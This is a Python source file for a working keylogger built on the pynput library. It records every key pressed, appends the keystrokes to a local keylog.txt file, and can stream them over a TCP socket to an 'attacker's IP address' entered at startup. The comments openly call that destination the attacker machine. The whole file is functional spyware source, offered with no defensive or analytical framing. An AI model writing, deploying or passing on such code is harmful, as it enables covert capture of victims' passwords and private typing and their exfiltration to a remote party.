import pynput #Library for Monitoring Input devices
from pynput.keyboard import Key, Listener
import socket
import threading


#File to Store logged keystrokes
log_file = "keylog.txt"

#List will hold the keystrokes temporarily
keys = []
tcp_client = None #Global Variable to hold TCP client

#Function to handle each key press event
def on_press(key):
    #Function is called whenever a key is pressed and saves it in the keys list 
    print(f"{key} pressed")
    keys.append(key)
    if len(keys) >= 8:
        if tcp_client is not None:
            send_to_server(keys)
        write_to_file(keys)
        keys.clear()

#Function to write the captured keystrokes to the file
def write_to_file(keys):
    #save it to text file, Specidal characters are handled for better readability
    with open(log_file, "a") as f:
        for key in keys:
            k = str(key).replace("'", "") # String representation of the key is cleaned by removing single quotes
            if k.find("space") > 0: # If space is detected , write 'space'
                f.write(" ")
            elif k.find("Key") == -1: # regular key, write as it is
                f.write(k)
            else:
                if k == "Key.enter":
                    f.write("\n") # Write a new line for 'Enter' Key
                elif k == "Key.tab":
                    f.write("\t") # Write a tab for 'Tab' Key
                elif k == "Key.esc":
                    f.write("[Esc]") # Log 'Esc' key as '[Esc]'

#Function to send Keystrokes to attacker machine via TCP
def send_to_server(keys):
    #send keystrokes to a remote server
    data = ""  # String to store the sanitized data
    for key in keys:
        k = str(key).replace("'", "")
        if k.find("space") > 0:  # Handle spaces
            data += " "
        elif k.find("Key") == -1:  # If it's a regular key, just append it
            data += k
        else:
            if k == "Key.enter":  # Handle Enter key
                data += "\n"
            elif k == "Key.tab":  # Handle Tab key
                data += "\t"
            elif k == "Key.esc":  # Handle Escape key
                data += "[Esc]"
    
    # Send the sanitized data to the server
    try:
        tcp_client.sendall(data.encode("utf-8"))  # Send the data to the server
    except Exception as e:
        print(f"Error sending data: {e}")

#Fucntion to handle key release event (listener will not stop on 'Esc')
def on_release(key):
    #Function is called when a key is released
    pass # No action

#Function to start the TCP connection
def start_tcp_connection(host, port):
    #Establishes to server beforehand
    global tcp_client
    try:
        tcp_client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        tcp_client.connect((host, port))
        print(f"Connected to {host}:{port}")
    except Exception as e:
        print(f"Error connecting to server: {e}")
        tcp_client = None

def main():
    print("Choose an Option:")
    print("1. Send Keystrokes to different machine(TCP).")
    print("2. Save keystrokes locally to file.")
    print("3. Do both")

    choice = input("Enter your choices (1, 2 or 3): ").strip()

    if choice == "1" or choice == "3":
        #If the user chooses option 1 or 3, request server details
        host = input("Enter the attacker's IP address: ")
        port = int(input("Enter the port to connect to: "))
        # start TCP connection in a separate thread to avoid blocking
        threading.Thread(target=start_tcp_connection, args=(host, port)).start()

    # Start the Key Listener
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
    
main()

